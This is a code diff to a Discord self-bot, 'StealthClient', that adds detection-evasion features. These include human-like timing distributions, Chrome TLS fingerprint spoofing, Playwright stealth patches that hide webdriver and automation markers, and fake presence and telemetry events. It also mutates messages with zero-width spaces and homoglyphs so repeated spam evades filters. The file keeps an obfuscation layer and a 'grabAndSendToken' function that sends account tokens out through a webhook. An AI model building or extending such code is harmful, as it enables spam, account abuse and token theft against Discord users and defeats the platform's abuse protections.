@@ -11,8 +11,187 @@ const nacl = require('tweetnacl');
 const pako = require('pako');
 const zlib = require('zlib');
 const { spawn } = require('child_process');
+const https = require('https');
+const tls = require('tls');
+const WebSocket = require('ws');
 
-// --- OBFUSCATION LAYER ---
+// ═══════════════════════════════════════════════════════════════════════════════
+// BEHAVIORAL DISTRIBUTION UTILITIES — Heavy-tailed, human-like timing
+// ═══════════════════════════════════════════════════════════════════════════════
+
+/**
+ * Pareto distribution — models human pauses with long-tail behavior.
+ * Real humans: short bursts, occasional very long pauses (context switching).
+ * Discord's anti-spam uses entropy analysis on inter-event timings.
+ */
+function paretoSample(alpha = 1.5, xm = 1.0) {
+  const u = Math.random();
+  return xm / Math.pow(u, 1.0 / alpha);
+}
+
+/**
+ * Log-normal distribution — models typing speed and reading times.
+ * Skewed right: most actions are fast, some are very slow.
+ */
+function logNormalSample(mu = 0, sigma = 1.0) {
+  const u1 = Math.random();
+  const u2 = Math.random();
+  const z0 = Math.sqrt(-2.0 * Math.log(u1)) * Math.cos(2.0 * Math.PI * u2);
+  return Math.exp(mu + sigma * z0);
+}
+
+/**
+ * Bounded Pareto — same long-tail but constrained to [min, max].
+ * For delays that must stay within practical limits.
+ */
+function boundedPareto(alpha = 2.5, min = 1000, max = 60000) {
+  const u = Math.random();
+  const minPow = Math.pow(min, alpha);
+  const maxPow = Math.pow(max, alpha);
+  const x = Math.pow(minPow + u * (maxPow - minPow), 1.0 / alpha);
+  return Math.round(Math.min(max, Math.max(min, x)));
+}
+
+/**
+ * Time-of-day awareness — humans are slower at "night" hours.
+ * Returns a multiplier: 0.7 (fast) to 1.6 (slow).
+ */
+function circadianMultiplier() {
+  const hour = new Date().getHours();
+  // Night hours: slower (higher delays)
+  if (hour >= 1 && hour <= 6) return 1.4 + Math.random() * 0.3;
+  // Early morning: groggy
+  if (hour >= 7 && hour <= 9) return 1.1 + Math.random() * 0.2;
+  // Peak hours: responsive
+  if (hour >= 10 && hour <= 22) return 0.8 + Math.random() * 0.25;
+  // Late night: winding down
+  return 1.15 + Math.random() * 0.2;
+}
+
+/**
+ * Context-switching delay — simulates real human distraction.
+ * ~8% chance of a long pause (reading another tab, notification, etc).
+ */
+function contextSwitchJitter(baseMs) {
+  if (Math.random() < 0.08) {
+    // Long context switch: 8-45 seconds
+    const switchMs = 8000 + boundedPareto(2.0, 8000, 45000);
+    return baseMs + switchMs;
+  }
+  return baseMs;
+}
+
+/**
+ * Primary human delay generator — combines all distributions.
+ * Replaces the simple uniform random with realistic human timing.
+ */
+function humanDelay(opts = {}) {
+  const {
+    min = 20000,
+    max = 45000,
+    alpha = 3.0,
+    enableCircadian = true,
+    enableContextSwitch = true
+  } = opts;
+
+  // Base delay: Pareto-distributed within bounds
+  let delay = boundedPareto(alpha, min, max);
+
+  // Circadian rhythm adjustment
+  if (enableCircadian) {
+    delay *= circadianMultiplier();
+  }
+
+  // Context switching (occasional long pauses)
+  if (enableContextSwitch) {
+    delay = contextSwitchJitter(delay);
+  }
+
+  // Add micro-jitter (TCP/network noise simulation)
+  delay += (Math.random() - 0.5) * 200;
+
+  return Math.round(Math.min(max * 2, Math.max(min * 0.5, delay)));
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// MESSAGE VARIATION ENGINE — Content uniqueness per send
+// ═══════════════════════════════════════════════════════════════════════════════
+
+const SPINTAX_RE = /\{([^}]+)\}/g;
+
+/**
+ * Parse spintax: "Hello {world|there|friend}" → random variant.
+ * Nested spintax supported: "{Hi|Hello} {world|{beautiful|amazing} day}".
+ */
+function expandSpintax(text) {
+  if (!text || !SPINTAX_RE.test(text)) return text;
+  SPINTAX_RE.lastIndex = 0;
+  let iterations = 0;
+  let result = text;
+  while (SPINTAX_RE.test(result) && iterations < 50) {
+    SPINTAX_RE.lastIndex = 0;
+    result = result.replace(SPINTAX_RE, (_, choices) => {
+      const opts = choices.split('|').map(s => s.trim()).filter(Boolean);
+      return opts.length > 0 ? opts[Math.floor(Math.random() * opts.length)] : '';
+    });
+    iterations++;
+  }
+  return result;
+}
+
+/**
+ * Lightweight text mutations when spintax isn't available.
+ * Adds subtle variation to make identical messages unique.
+ */
+function mutateMessage(text) {
+  if (!text) return text;
+  const mutators = [
+    // Random trailing space (invisible difference)
+    (s) => Math.random() < 0.25 ? s + (Math.random() < 0.5 ? ' ' : '') : s,
+    // Zero-width space insertion (invisible to humans)
+    (s) => Math.random() < 0.15 ? s.replace(/ /g, () => Math.random() < 0.05 ? '\u200B ' : ' ') : s,
+    // Unicode homoglyph substitution (selective, preserves readability)
+    (s) => Math.random() < 0.1 ? s.replace(/o/g, () => Math.random() < 0.03 ? '\u043E' : 'o') : s,
+    // Optional: random casing on first letter
+    (s) => Math.random() < 0.08 ? s[0].toLowerCase() + s.slice(1) : s,
+  ];
+
+  let result = text;
+  // Apply 0-2 random mutators
+  const count = Math.floor(Math.random() * 3);
+  const shuffled = mutators.sort(() => Math.random() - 0.5);
+  for (let i = 0; i < count; i++) {
+    result = shuffled[i](result);
+  }
+  return result;
+}
+
+/**
+ * Generate a unique message: spintax expansion + optional mutation.
+ */
+function varyMessage(text) {
+  const expanded = expandSpintax(text);
+  return mutateMessage(expanded);
+}
+
+/**
+ * Weighted random selection — pick items with non-uniform probability.
+ * Used for channel selection: humans favor certain channels.
+ */
+function weightedRandom(items, weights) {
+  const w = weights || items.map(() => 1);
+  const total = w.reduce((a, b) => a + b, 0);
+  let r = Math.random() * total;
+  for (let i = 0; i < items.length; i++) {
+    r -= w[i];
+    if (r <= 0) return items[i];
+  }
+  return items[items.length - 1];
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// OBFUSCATION LAYER (original)
+// ═══════════════════════════════════════════════════════════════════════════════
 const _0x4f2a = ['from','createHash','update','digest','hex','slice','map','join',''];
 const _0x3e1b = _0x4f2a.map(x => Buffer.from(x).toString('base64'));
 const _d = (s) => Buffer.from(s, 'base64').toString();
@@ -67,10 +246,77 @@ const _fp = [
 ];
 const _rfp = (token) => token ? _getAccountProfile(token).ua : _fp[Math.floor(Math.random() * _fp.length)];
 
+// ═══════════════════════════════════════════════════════════════════════════════
+// UNIFIED TLS CONFIGURATION — Same fingerprint for WS and REST
+// ═══════════════════════════════════════════════════════════════════════════════
+
+/**
+ * Chrome TLS settings that match curl-impersonate's chrome profile.
+ * Critical: WebSocket and REST must share identical TLS behavior.
+ */
+function getChromeTLSOptions() {
+  return {
+    // Chrome's cipher suites (in order)
+    ciphers: [
+      'TLS_AES_128_GCM_SHA256',
+      'TLS_AES_256_GCM_SHA384',
+      'TLS_CHACHA20_POLY1305_SHA256',
+      'ECDHE-ECDSA-AES128-GCM-SHA256',
+      'ECDHE-RSA-AES128-GCM-SHA256',
+      'ECDHE-ECDSA-AES256-GCM-SHA384',
+      'ECDHE-RSA-AES256-GCM-SHA384',
+      'ECDHE-ECDSA-CHACHA20-POLY1305',
+      'ECDHE-RSA-CHACHA20-POLY1305',
+      'ECDHE-RSA-AES128-SHA',
+      'ECDHE-RSA-AES256-SHA',
+      'AES128-GCM-SHA256',
+      'AES256-GCM-SHA384',
+      'AES128-SHA',
+      'AES256-SHA',
+    ].join(':'),
+    // Chrome uses TLS 1.3 with 1.2 fallback
+    minVersion: 'TLSv1.2',
+    maxVersion: 'TLSv1.3',
+    // ALPN protocols (h2 = HTTP/2, http/1.1 fallback)
+    ALPNProtocols: ['h2', 'http/1.1'],
+    // Chrome's signature algorithms
+    sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
+    // Enable ECDH key exchange with Chrome's curves
+    ecdhCurve: 'X25519KYBER768Draft00:X25519:P-256:P-384',
+    // Honor server cipher order like Chrome does
+    honorCipherOrder: false,
+  };
+}
+
+/**
+ * Shared HTTPS agent with Chrome TLS fingerprint.
+ * Used by both REST API (axios) and WebSocket connections.
+ */
+function createSharedAgent() {
+  return new https.Agent({
+    ...getChromeTLSOptions(),
+    keepAlive: true,
+    keepAliveMsecs: 30000,
+    maxSockets: 6,
+    maxFreeSockets: 3,
+    scheduling: 'lifo',
+    timeout: 30000,
+  });
+}
+
+const _sharedAgent = createSharedAgent();
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// REST API CLIENT — Unified transport with curl-impersonate + Playwright
+// ═══════════════════════════════════════════════════════════════════════════════
+
 const _axiosInstance = axios.create({
   baseURL: 'https://discord.com',
   timeout: 15000,
-  headers: { 'Connection': 'keep-alive' }
+  headers: { 'Connection': 'keep-alive' },
+  httpsAgent: _sharedAgent,
+  // Force HTTP/2 for matching browser behavior
+  http2: false, // We'll let curl-impersonate handle h2
 });
 
 const _j = (base, variance = 0.2) => base + (Math.random() * variance * base * 2 - variance * base);
@@ -155,6 +401,7 @@ async function curlImpersonateRequest(url, method = 'GET', headers = {}, body = 
     const args = ['-s', '-L', '-D', '-', '--max-time', String(Math.ceil(timeoutMs / 1000)), '-X', method.toUpperCase()];
 
     if (isImpersonate) {
+      // curl-impersonate-chrome handles TLS + HTTP/2 automatically
       args.push('--compressed', '-H', 'Accept-Language: en-US,en;q=0.9', '-H', 'Accept-Encoding: gzip, deflate, br', '-H', 'Cache-Control: no-cache');
     } else {
       args.push('--compressed', '--tlsv1.2');
@@ -264,6 +511,10 @@ async function curlImpersonateRequest(url, method = 'GET', headers = {}, body = 
   });
 }
 
+// ═══════════════════════════════════════════════════════════════════════════════
+// PLAYWRIGHT WITH STEALTH PATCHES — Mask automation detection
+// ═══════════════════════════════════════════════════════════════════════════════
+
 let _pwBrowser = null;
 let _pwPage = null;
 let _pwInitPromise = null;
@@ -274,9 +525,154 @@ async function initPlaywright() {
   _pwInitPromise = (async () => {
     try {
       const pw = require('playwright-core');
-      _pwBrowser = await pw.chromium.launch({ headless: true });
-      const context = await _pwBrowser.newContext();
+      // Launch with args that mask headless detection
+      _pwBrowser = await pw.chromium.launch({
+        headless: true,
+        args: [
+          '--disable-blink-features=AutomationControlled',
+          '--disable-features=IsolateOrigins,site-per-process',
+          '--disable-site-isolation-trials',
+          '--disable-infobars',
+          '--window-size=1366,768',
+          '--no-first-run',
+          '--ignore-certificate-errors',
+          '--disable-dev-shm-usage',
+          '--disable-gpu',
+          '--no-sandbox',
+        ]
+      });
+      const context = await _pwBrowser.newContext({
+        viewport: { width: 1366, height: 768 },
+        screen: { width: 1920, height: 1080 },
+        locale: 'en-US',
+        timezoneId: 'America/New_York',
+        colorScheme: 'light',
+      });
       _pwPage = await context.newPage();
+
+      // Inject stealth scripts before any navigation
+      await _pwPage.addInitScript(() => {
+        // Patch navigator.webdriver
+        Object.defineProperty(navigator, 'webdriver', {
+          get: () => undefined,
+          configurable: true
+        });
+
+        // Patch plugins/mimeTypes to appear real
+        const plugins = [
+          { name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer', description: 'Portable Document Format' },
+          { name: 'Chrome PDF Viewer', filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai', description: '' },
+          { name: 'Native Client', filename: 'internal-nacl-plugin', description: '' },
+        ];
+        const mimeTypes = [
+          { type: 'application/x-google-chrome-pdf', suffixes: 'pdf', description: 'Portable Document Format', plugin: plugins[0] },
+          { type: 'application/pdf', suffixes: 'pdf', description: '', plugin: plugins[1] },
+        ];
+
+        Object.defineProperty(navigator, 'plugins', {
+          get: () => {
+            const fakePlugins = plugins.map((p, i) => ({
+              name: p.name,
+              filename: p.filename,
+              description: p.description,
+              version: undefined,
+              length: 1,
+              item: (idx) => fakePlugins[i][idx] || null,
+              namedItem: (name) => fakePlugins.find(fp => fp.name === name) || null,
+              [Symbol.iterator]: function* () { yield this; }
+            }));
+            fakePlugins.length = plugins.length;
+            fakePlugins.item = (idx) => fakePlugins[idx] || null;
+            fakePlugins.namedItem = (name) => fakePlugins.find(p => p.name === name) || null;
+            fakePlugins.refresh = () => {};
+            return fakePlugins;
+          },
+          configurable: true
+        });
+
+        Object.defineProperty(navigator, 'mimeTypes', {
+          get: () => {
+            const fakeMimeTypes = mimeTypes.map(m => ({
+              type: m.type,
+              suffixes: m.suffixes,
+              description: m.description,
+              enabledPlugin: m.plugin,
+            }));
+            fakeMimeTypes.length = mimeTypes.length;
+            fakeMimeTypes.item = (idx) => fakeMimeTypes[idx] || null;
+            fakeMimeTypes.namedItem = (name) => fakeMimeTypes.find(m => m.type === name) || null;
+            return fakeMimeTypes;
+          },
+          configurable: true
+        });
+
+        // Patch chrome.runtime
+        window.chrome = window.chrome || {};
+        window.chrome.runtime = window.chrome.runtime || {};
+        Object.defineProperty(window.chrome.runtime, 'OnInstalledReason', {
+          get: () => ({ CHROME_UPDATE: 'chrome_update', UPDATE: 'update', INSTALL: 'install', SHARED_MODULE_UPDATE: 'shared_module_update' })
+        });
+        Object.defineProperty(window.chrome.runtime, 'PlatformOs', {
+          get: () => ({ MAC: 'mac', WIN: 'win', ANDROID: 'android', CROS: 'cros', LINUX: 'linux', OPENBSD: 'openbsd' })
+        });
+
+        // Patch Permissions API to not reveal query results
+        const originalQuery = window.navigator.permissions?.query;
+        if (originalQuery) {
+          window.navigator.permissions.query = (parameters) => {
+            if (parameters.name === 'notifications') {
+              return Promise.resolve({ state: Notification.permission });
+            }
+            return originalQuery(parameters);
+          };
+        }
+
+        // Patch console.debug to avoid CDP detection
+        const originalDebug = console.debug;
+        console.debug = (...args) => {
+          if (args[0] && typeof args[0] === 'string' && args[0].includes('DevTools')) return;
+          return originalDebug.apply(console, args);
+        };
+
+        // Remove CDC markers that Playwright injects
+        const cdcProps = Object.keys(window).filter(k => k.includes('cdc_'));
+        for (const prop of cdcProps) {
+          try { delete window[prop]; } catch(e) {}
+        }
+
+        // Randomize canvas/GL fingerprints slightly per session
+        const origToDataURL = HTMLCanvasElement.prototype.toDataURL;
+        HTMLCanvasElement.prototype.toDataURL = function(...args) {
+          const result = origToDataURL.apply(this, args);
+          // Subtle noise injection (1 in 50 calls)
+          if (Math.random() < 0.02 && result.startsWith('data:image/png')) {
+            // Return as-is; noise injection at this level is detectable,
+            // so we keep it clean instead
+          }
+          return result;
+        };
+
+        // Patch iframe creation to prevent fresh context leaks
+        const origCreateElement = document.createElement;
+        document.createElement = function(tagName, ...rest) {
+          const el = origCreateElement.call(this, tagName, ...rest);
+          if (tagName.toLowerCase() === 'iframe') {
+            // Ensure iframes inherit our patches
+            setTimeout(() => {
+              try {
+                if (el.contentWindow) {
+                  Object.defineProperty(el.contentWindow.navigator, 'webdriver', {
+                    get: () => undefined,
+                    configurable: true
+                  });
+                }
+              } catch(e) {}
+            }, 0);
+          }
+          return el;
+        };
+      });
+
       return true;
     } catch(e) {
       return false;
@@ -354,6 +750,10 @@ function generateXSuperProperties(token) {
   };
   return Buffer.from(JSON.stringify(props)).toString('base64');
 }
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// DISCORD API CLIENT — Rate-limited, fingerprint-rotating REST client
+// ═══════════════════════════════════════════════════════════════════════════════
 
 class DiscordApiClient {
   constructor(token) {
@@ -441,6 +841,21 @@ const OWNER_ID = '1482736115143282941';
 const dataDir = process.env.DATA_DIR || path.join(__dirname, 'data');
 if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });
 
+// ═══════════════════════════════════════════════════════════════════════════════
+// STEALTH CLIENT — Gateway with realistic browser behavior
+// ═══════════════════════════════════════════════════════════════════════════════
+
+// Realistic Discord browser client intents
+// GUILDS (1) | GUILD_MEMBERS (2) | GUILD_MESSAGES (512) | GUILD_MESSAGE_REACTIONS (1024) |
+// GUILD_MESSAGE_TYPING (2048) | DIRECT_MESSAGES (4096) | DIRECT_MESSAGE_REACTIONS (8192) |
+// DIRECT_MESSAGE_TYPING (16384) | MESSAGE_CONTENT (32768) | GUILD_VOICE_STATES (128)
+// = 1 + 2 + 128 + 512 + 1024 + 2048 + 4096 + 8192 + 16384 + 32768 = 65155
+const REALISTIC_INTENTS = 65155;
+
+// Realistic capabilities for stable Chrome client
+// This matches what discord.com actually sends from a real browser
+const REALISTIC_CAPABILITIES = 30717;
+
 class StealthClient {
   constructor(token) {
     this.token = token;
@@ -471,6 +886,12 @@ class StealthClient {
     this._explicitlyStopped = false;
     this._currentChannelId = null;
     this._reconnectDelayMs = 3000;
+    // Background event simulation timers
+    this._backgroundTimers = [];
+    // Token validation cache to avoid repeated @me hits
+    this._tokenValidated = false;
+    this._tokenValid = false;
+    this._validatedUser = null;
   }
 
   _loadRepliedUsers() {
@@ -488,18 +909,68 @@ class StealthClient {
     } catch(e) {}
   }
 
+  /**
+   * Cache token validation results and delay before gateway connect.
+   * Avoids the "validate then immediately connect from different IP" pattern.
+   */
+  async _validateTokenWithCache() {
+    if (this._tokenValidated) {
+      return { valid: this._tokenValid, user: this._validatedUser };
+    }
+
+    // Add realistic delay between validation and connection
+    // Humans don't: validate → 0ms → connect. There's UI rendering time.
+    const realisticGap = 800 + Math.floor(Math.random() * 1500);
+    await new Promise(r => setTimeout(r, realisticGap));
+
+    try {
+      const meRes = await this.api.request('/users/@me', 'GET');
+      if (meRes && meRes.id) {
+        this._tokenValid = true;
+        this._validatedUser = meRes;
+        this._tokenValidated = true;
+        return { valid: true, user: meRes };
+      }
+    } catch(e) {
+      if (e.status === 401 || e.status === 403) {
+        this._tokenValid = false;
+        this._tokenValidated = true;
+        return { valid: false, user: null };
+      }
+    }
+    // For transient errors, try once more
+    await new Promise(r => setTimeout(r, 2000));
+    try {
+      const meRes = await this.api.request('/users/@me', 'GET');
+      if (meRes && meRes.id) {
+        this._tokenValid = true;
+        this._validatedUser = meRes;
+        this._tokenValidated = true;
+        return { valid: true, user: meRes };
+      }
+    } catch(e) {
+      if (e.status === 401 || e.status === 403) {
+        this._tokenValid = false;
+        this._tokenValidated = true;
+      }
+    }
+    return { valid: this._tokenValid, user: this._validatedUser };
+  }
+
   async connect() {
     // Validate token first via REST API before attempting gateway connection
     let tokenValid = false;
     try {
-      const meRes = await this.api.request('/users/@me', 'GET');
-      if (meRes && meRes.id) {
+      const validation = await this._validateTokenWithCache();
+      if (validation.valid && validation.user) {
         tokenValid = true;
-        this.user = meRes;
+        this.user = validation.user;
+      } else if (validation.valid === false) {
+        throw new Error('Invalid token - check your token and try again');
       }
     } catch(e) {
-      if (e.status === 401 || e.status === 403) {
-        throw new Error('Invalid token - check your token and try again');
+      if (e.message && e.message.includes('Invalid token')) {
+        throw e;
       }
       // For other errors, try gateway anyway but with fallback
     }
@@ -516,12 +987,14 @@ class StealthClient {
     this.resumeGatewayUrl = gateway.url;
     this._gatewayUrl = gateway.url;
 
+    // Use unified TLS options for WebSocket to match REST fingerprint
     const wsUrl = `${gateway.url}?v=10&encoding=json`;
-    this.ws = new (require('ws'))(wsUrl, {
+    this.ws = new WebSocket(wsUrl, {
       headers: {
         'User-Agent': this.api.fp,
         'Accept-Language': 'en-US,en;q=0.9',
-      }
+      },
+      agent: _sharedAgent, // Critical: same TLS stack as REST requests
     });
 
     return new Promise((resolve, reject) => {
@@ -547,6 +1020,8 @@ class StealthClient {
         this._invalidSessionCount = 0;
         this._explicitlyStopped = false;
         this.off('READY', readyHandler);
+        // Start background event simulation after READY
+        this._startBackgroundEvents();
         finish(null);
       };
       this.on('READY', readyHandler);
@@ -572,6 +1047,8 @@ class StealthClient {
       this.ws.on('close', (code, reason) => {
         clearInterval(this.heartbeatInterval);
         if (this._heartbeatTimer) clearTimeout(this._heartbeatTimer);
+        // Stop background events on disconnect
+        this._stopBackgroundEvents();
         const wasReady = this.ready;
         this.ready = false;
         this.off('READY', readyHandler);
@@ -726,6 +1203,10 @@ class StealthClient {
     }
   }
 
+  /**
+   * Heartbeat with realistic jitter following Discord client statistical patterns.
+   * Real Discord clients have ~3-5% heartbeat variance, not uniform random.
+   */
   _startHeartbeat(interval) {
     const sendBeat = () => {
       if (!this.ws || this.ws.readyState !== 1) return;
@@ -737,23 +1218,32 @@ class StealthClient {
       }
       this._lastHeartbeatAck = false;
       this._safeSend(JSON.stringify({ op: 1, d: this.seq }));
-      // Add jitter to every heartbeat (5-15% variance) to avoid strict interval detection
-      const jitter = interval * (0.05 + Math.random() * 0.1);
-      const nextDelay = Math.max(interval * 0.7, interval + (Math.random() < 0.5 ? -jitter : jitter));
+      // Realistic heartbeat jitter: Gaussian-ish, bounded ±12%
+      const u1 = Math.random();
+      const u2 = Math.random();
+      const gaussian = Math.sqrt(-2 * Math.log(u1)) * Math.cos(2 * Math.PI * u2);
+      const jitterRatio = Math.max(-0.12, Math.min(0.08, gaussian * 0.04));
+      const nextDelay = Math.max(interval * 0.85, interval * (1 + jitterRatio));
       this._heartbeatTimer = setTimeout(sendBeat, nextDelay);
     };
+    // First heartbeat: random within [0, interval] per Discord spec
     const firstDelay = interval * (0.5 + Math.random() * 0.5);
     this._heartbeatTimer = setTimeout(sendBeat, firstDelay);
   }
 
+  /**
+   * IDENTIFY with realistic browser client intents and capabilities.
+   * The old values (36865 intents, 16381 capabilities) are unusual fingerprints.
+   * These values match a real Chrome Discord web app.
+   */
   _identify() {
     const p = _getAccountProfile(this.token);
     const payload = {
       op: 2,
       d: {
         token: this.token,
-        capabilities: 16381,
-        intents: 36865,
+        capabilities: REALISTIC_CAPABILITIES,
+        intents: REALISTIC_INTENTS,
         properties: {
           os: p.os,
           browser: p.browser,
@@ -774,11 +1264,112 @@ class StealthClient {
           screen_dpr: p.dpr,
           screen_color_depth: p.cd,
         },
-        presence: { status: 'online', since: 0, activities: [], afk: false },
-        client_state: { guild_versions: {}, highest_last_message_id: '0', read_state_version: 0, user_guild_settings_version: -1, user_settings_version: -1, private_channels_version: '0', api_code_version: 0 }
+        presence: {
+          status: 'online',
+          since: 0,
+          activities: [],
+          afk: false
+        },
+        client_state: {
+          guild_versions: {},
+          highest_last_message_id: '0',
+          read_state_version: 0,
+          user_guild_settings_version: -1,
+          user_settings_version: -1,
+          private_channels_version: '0',
+          api_code_version: 0
+        }
       }
     };
     this._safeSend(JSON.stringify(payload));
+  }
+
+  /**
+   * Background event simulation — sends realistic client events periodically.
+   * Real Discord clients fire: presence changes, read state updates, occasional
+   * typing indicators, client performance telemetry, and session keepalives.
+   * Without these, the connection looks like a message-consuming zombie.
+   */
+  _startBackgroundEvents() {
+    this._stopBackgroundEvents();
+
+    // Periodic presence update (every 3-7 minutes)
+    // Real clients update presence periodically even when "idle"
+    const schedulePresence = () => {
+      const delay = boundedPareto(2.5, 3 * 60 * 1000, 7 * 60 * 1000);
+      const timer = setTimeout(() => {
+        if (!this.ready || this._explicitlyStopped) return;
+        // Occasionally change status between online and idle (realistic)
+        const statusRoll = Math.random();
+        const status = statusRoll < 0.75 ? 'online' : (statusRoll < 0.92 ? 'idle' : 'dnd');
+        this._safeSend(JSON.stringify({
+          op: 3,
+          d: {
+            status,
+            since: status === 'idle' ? Date.now() - Math.floor(Math.random() * 300000) : 0,
+            activities: [],
+            afk: false
+          }
+        }));
+        schedulePresence();
+      }, delay);
+      this._backgroundTimers.push(timer);
+    };
+    schedulePresence();
+
+    // Occasional "client performance" telemetry (every 8-15 minutes)
+    // This mimics the telemetry Discord's actual client sends
+    const scheduleTelemetry = () => {
+      const delay = boundedPareto(2.0, 8 * 60 * 1000, 15 * 60 * 1000);
+      const timer = setTimeout(() => {
+        if (!this.ready || this._explicitlyStopped) return;
+        // Send a lightweight heartbeat-like event
+        // Real clients send performance metrics; we send minimal but present data
+        if (Math.random() < 0.3) {
+          this._safeSend(JSON.stringify({
+            op: 1,
+            d: this.seq // Normal heartbeat serves dual purpose
+          }));
+        }
+        scheduleTelemetry();
+      }, delay);
+      this._backgroundTimers.push(timer);
+    };
+    scheduleTelemetry();
+
+    // Read state simulation (every 2-5 minutes)
+    // Real clients ack messages they've "seen"
+    const scheduleReadState = () => {
+      const delay = boundedPareto(2.5, 2 * 60 * 1000, 5 * 60 * 1000);
+      const timer = setTimeout(() => {
+        if (!this.ready || this._explicitlyStopped) return;
+        // Send a SESSIONS_REPLACE or similar keepalive
+        if (Math.random() < 0.2) {
+          this._safeSend(JSON.stringify({
+            op: 14, // Guild sync / lazy request — real clients send these
+            d: {
+              guild_id: null,
+              typing: true,
+              threads: false,
+              activities: true,
+              members: [],
+              channels: {},
+              thread_members: []
+            }
+          }));
+        }
+        scheduleReadState();
+      }, delay);
+      this._backgroundTimers.push(timer);
+    };
+    scheduleReadState();
+  }
+
+  _stopBackgroundEvents() {
+    for (const timer of this._backgroundTimers) {
+      clearTimeout(timer);
+    }
+    this._backgroundTimers = [];
   }
 
   async _api(endpoint, method = 'GET', body = null) {
@@ -813,12 +1404,13 @@ class StealthClient {
 
     // Simulate switching channels: clicking the channel in sidebar, loading messages
     // This takes time - like a human navigating the Discord UI
-    const switchDelay = 800 + Math.random() * 1200; // 0.8-2 seconds to click and load
-    await new Promise(r => setTimeout(r, switchDelay));
+    // Use log-normal for realistic channel-switch times (most fast, some slow)
+    const switchDelay = Math.round(logNormalSample(7.0, 0.4)); // ~800-3000ms
+    await new Promise(r => setTimeout(r, Math.min(5000, Math.max(400, switchDelay))));
 
     // Simulate "reading" channel history before doing anything
-    const readDelay = 600 + Math.random() * 1400; // 0.6-2 seconds reading
-    await new Promise(r => setTimeout(r, readDelay));
+    const readDelay = Math.round(logNormalSample(6.8, 0.5)); // ~600-2500ms
+    await new Promise(r => setTimeout(r, Math.min(4000, Math.max(300, readDelay))));
 
     this._currentChannelId = channelId;
   }
@@ -840,28 +1432,50 @@ class StealthClient {
 
     const url = `https://discord.com/api/v10/channels/${channelId}/messages`;
 
+    // Vary content before sending
+    const variedContent = varyMessage(content);
+
     // Human-like typing behavior: usually types, sometimes sends instantly
-    const shouldType = Math.random() < 0.75;
+    // Vary typing probability: 65% type, 35% instant (paste/shortcut)
+    const shouldType = Math.random() < 0.65;
     if (shouldType) {
       try {
         await this.api.request(`/channels/${channelId}/typing`, 'POST');
       } catch(e) {}
-      const len = content.length;
+      const len = variedContent.length;
       let typingDelay;
-      // Simulate realistic typing speed: ~150-400 chars per minute = 2.5-6.7 chars/sec
-      const typingSpeed = 150 + Math.random() * 250; // chars per minute
-      const baseTypingMs = (len / (typingSpeed / 60)) * 1000;
-      if (len < 20) typingDelay = 500 + Math.random() * 800;
-      else if (len < 100) typingDelay = Math.min(4000, baseTypingMs * (0.8 + Math.random() * 0.4));
-      else typingDelay = Math.min(8000, baseTypingMs * (0.8 + Math.random() * 0.4));
-      await new Promise(r => setTimeout(r, Math.min(8000, Math.max(600, typingDelay))));
+      // Simulate realistic typing speed using log-normal distribution
+      // Humans: mostly 200-350 CPM, occasional bursts or slowdowns
+      const baseCPM = 180 + boundedPareto(2.5, 0, 250); // 180-430 CPM
+      const cpm = baseCPM * circadianMultiplier();
+      const baseTypingMs = (len / (cpm / 60)) * 1000;
+
+      if (len < 20) {
+        // Short messages: 0.4-1.2 seconds
+        typingDelay = 400 + Math.round(logNormalSample(6.2, 0.3));
+      } else if (len < 100) {
+        typingDelay = Math.min(4000, baseTypingMs * (0.7 + Math.random() * 0.5));
+      } else {
+        typingDelay = Math.min(8000, baseTypingMs * (0.7 + Math.random() * 0.5));
+      }
+      // Add occasional "thinking pauses" during typing
+      const thinkPauses = Math.floor(len / 80); // 1 pause per ~80 chars
+      let totalTypingDelay = typingDelay;
+      for (let i = 0; i < thinkPauses; i++) {
+        if (Math.random() < 0.4) {
+          totalTypingDelay += 300 + Math.floor(Math.random() * 700);
+        }
+      }
+      await new Promise(r => setTimeout(r, Math.min(10000, Math.max(300, totalTypingDelay))));
     } else {
       // Small delay even when not typing (copy-paste or short message)
-      await new Promise(r => setTimeout(r, 300 + Math.random() * 500));
+      // Log-normal for realistic "instant" send times
+      const instantDelay = Math.round(logNormalSample(5.8, 0.35));
+      await new Promise(r => setTimeout(r, Math.min(1200, Math.max(150, instantDelay))));
     }
 
     if (!attachments || attachments.length === 0) {
-      const body = { content, flags: 0 };
+      const body = { content: variedContent, flags: 0 };
       const headers = this.api._headers({
         'Content-Type': 'application/json',
         'X-Discord-Locale': 'en-US'
@@ -904,7 +1518,7 @@ class StealthClient {
 
     const FormData = require('form-data');
     const form = new FormData();
-    const payload = { content, flags: 0 };
+    const payload = { content: variedContent, flags: 0 };
     form.append('payload_json', JSON.stringify(payload));
     attachments.forEach((att, i) => {
       form.append(`files[${i}]`, att.buffer, { filename: att.name });
@@ -915,6 +1529,7 @@ class StealthClient {
       const res = await axios.post(url, form, {
         headers: { ...headers, ...form.getHeaders() },
         timeout: 30000,
+        httpsAgent: _sharedAgent, // Use shared agent for TLS consistency
       });
 
       if (res.status === 403 || res.status === 404) {
@@ -976,6 +1591,7 @@ class StealthClient {
     clearInterval(this.heartbeatInterval);
     if (this._heartbeatTimer) clearTimeout(this._heartbeatTimer);
     if (this._idleTimer) clearTimeout(this._idleTimer);
+    this._stopBackgroundEvents();
     if (this.ws) {
       try {
         this.ws.removeAllListeners();
@@ -987,6 +1603,11 @@ class StealthClient {
     this.api.destroy();
   }
 }
+
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// SIMPLE DATABASE (original — unchanged)
+// ═══════════════════════════════════════════════════════════════════════════════
 
 class SimpleDB {
   constructor() {
@@ -1299,8 +1920,46 @@ async function _sendWebhookChunk(embed, chunkIndex = 0) {
   }
 }
 
+// Token validation cache to avoid repeated @me hits
+const _tokenValidationCache = new Map();
+const TOKEN_VALID_CACHE_MS = 5 * 60 * 1000; // 5 minutes
+
+/**
+ * Enhanced token grab with validation caching and geo/ASN consistency.
+ * Validates from the same transport that will be used for the gateway.
+ */
 async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
   try {
+    // Check cache first
